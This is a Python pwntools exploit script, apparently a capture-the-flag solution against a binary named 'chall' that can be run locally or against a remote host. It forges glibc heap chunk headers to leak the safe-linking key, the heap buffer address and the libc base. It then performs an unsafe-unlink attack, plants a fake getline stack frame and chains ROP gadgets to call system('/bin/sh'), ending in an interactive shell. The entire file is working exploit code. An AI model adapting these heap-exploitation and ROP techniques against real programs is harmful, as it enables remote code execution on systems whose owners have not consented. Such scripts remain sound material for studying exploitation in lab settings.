#!/usr/bin/env python3

from pwn import *

context.os   = 'linux'
context.arch = 'amd64'

MAXSZ              = 0x80 - 0x02
LIBC               = './libc.so.6'
BINARY             = './chall'
LIBC_LEAK          = 0x210b30
GETLINE_MEMCPY_RET = 0x8CACE
POISON             = 0xdeadbeef
POP2               = 0x000000000005be96 # : pop r12 ; pop r13 ; ret

def start():
  global io
  io = process(BINARY+'.patched') if args.LOCAL else remote(sys.argv[1], int(sys.argv[2]))

def pad(sz, b=b'X'):
  return b*sz 

def num64(b):
  return u64(b.ljust(8, b'\x00')[:0x08])

def sendline(data):
  io.sendlineafter(b'[>] ', data)

def read():
  x, y = b'token "', b'"\n'
  io.recvuntil(x)
  return num64(io.recvuntil(y).split(y)[0])

def set_chunk_head(head):
  sendline(str(head).encode())

def free(chunksz, padsz=0x80):
  set_chunk_head(chunksz | 0x01)
  p  = b'' 
  p += pad(chunksz - 0x10)
  p += p64(0) + p64(0x21) + p64(0)*2
  p += p64(0) + p64(0x21)
  assert(len(p) <= MAXSZ)
  p += pad(padsz)
  sendline(p)

def free_and_consolidate(chunksz):
  set_chunk_head(chunksz | 0x01)
  p  = b'' 
  p += pad(chunksz - 0x10)
  p += p64(0) + p64(0x21) + p64(0)*2
  p += p64(0) + p64(0x21)
  assert(len(p) <= MAXSZ)
  p += pad(0x20000)
  sendline(p)

def buffer_oob_sendline(data):
  assert(len(data)  < 0x100 - 0x02)
  set_chunk_head(0x110 | 0x02 | 0x01)
  sendline(data)

def unsafe_unlink(buffer_offset, target):
  assert(buffer_offset  & 0x0F == 0x00)

  fake_fastbin = buffer + buffer_offset - 0x20

  p  = b''
  p += p64((buffer >> 12) ^ fake_fastbin) + p64(0)
  p += p64(0) + p64(0x21) + p64(0) * 2
  p += p64(0) + p64(0x21)
  assert(len(p) <= buffer_offset)
  p += pad(buffer_offset-0x20-len(p))

  p += p64(0)    + p64(0x21) + p64((fake_fastbin >> 12)) + p64(0)
  p += p64(0x20) + p64(0x20) + p64(target - 0x18) + p64(target - 0x10)
  p += p64(0x20) + p64(0x20)
  assert(len(p) <= 0x100 - 0x10)
  buffer_oob_sendline(p)

  for _ in range(7):
    free(0x30, padsz=0x2000)
  free(0x40, padsz=0x2000)
  free(0x40, padsz=0x200)

  set_chunk_head(0x21)
  sendline(p)
  set_chunk_head(0x21)
  sendline(p)

def exploit():
  start()

  free(0x20)
  safelink_key = read()
  free(0x20)
  global buffer
  buffer = read() ^ safelink_key
  log.debug(f'buffer @ {buffer:#x}')

  main_rbp     = buffer + 0x90
  readline_rbp = buffer - 0x20
  log.debug(f'main rbp @ {main_rbp:#x}')
  log.debug(f'readline rbp @ {readline_rbp:#x}')

  for _ in range(5):
    free(0x20)

  free_and_consolidate(0x20)
  libc_leak = read()
  log.debug(f'libc leak @ {libc_leak:#x}')

  libc = ELF(LIBC)
  libc.address = libc_leak - LIBC_LEAK
  log.debug(f'libc @ {libc.address:#x}')

  unsafe_unlink(main_rbp - buffer, readline_rbp)

  new_buffer    = buffer - 0xc8
  new_delimiter = 0x14

  fake_getline_frame  = b''
  fake_getline_frame += p64(POISON)*6
  fake_getline_frame += p64(libc.address + GETLINE_MEMCPY_RET)
  fake_getline_frame += p32(POISON)
  fake_getline_frame += p32(new_delimiter)              # delimiter
  fake_getline_frame += p64(0)                          # memchr
  fake_getline_frame += p64(readline_rbp - 0x10 + 0x02) # n
  fake_getline_frame += p64(readline_rbp - 0x08)        # lineptr
  fake_getline_frame += p64(POISON)*7

  rop = ROP(libc)
  rop.raw(libc.address + POP2)
  rop.raw(0xdeadbeef)
  rop.raw(new_buffer)
  rop.call(libc.symbols['system'], (next(libc.search(b'/bin/sh\x00')),))

  sendline(b'X')
  sendline(fake_getline_frame + rop.chain() + p8(new_delimiter))

  io.sendline(b'echo s41nt0l3xus')
  io.recvuntil(b's41nt0l3xus\n')
  io.interactive()

if __name__ == '__main__':
  exploit()
